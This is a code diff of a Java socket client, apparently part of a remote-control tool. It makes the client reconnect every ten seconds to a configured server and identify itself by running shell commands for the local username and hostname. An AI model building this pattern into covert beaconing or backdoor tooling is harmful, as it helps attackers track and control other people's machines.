@@ -13,7 +13,7 @@ public class BeSocketClient {
     public void connect(){
         while(socket == null) {
             try {
-                Thread.sleep(1000);
+                Thread.sleep(10000);
                 connectServer();
             } catch (ConnectException e) {
                 e.printStackTrace();
@@ -24,11 +24,12 @@ public class BeSocketClient {
     }
 
     public void connectServer() throws Exception{
-        socket = new Socket("127.0.0.1",8867);
-        System.out.println("socket = new Socket(\"127.0.0.1\",8867);");
+        socket = new Socket(PropertiesConst.server,PropertiesConst.port);
         bufferedReader = new BufferedReader(new InputStreamReader(socket.getInputStream()));
         printWriter = new PrintWriter(new OutputStreamWriter(socket.getOutputStream()));
-        sendMessage("be");
+        String key = CmdUtil.execCloseReturnStr("echo %username%")+CmdUtil.execCloseReturnStr("hostname");
+        key = key.replaceAll("\n","");
+        sendMessage(key);
         System.out.println("连接成功");
     }
 
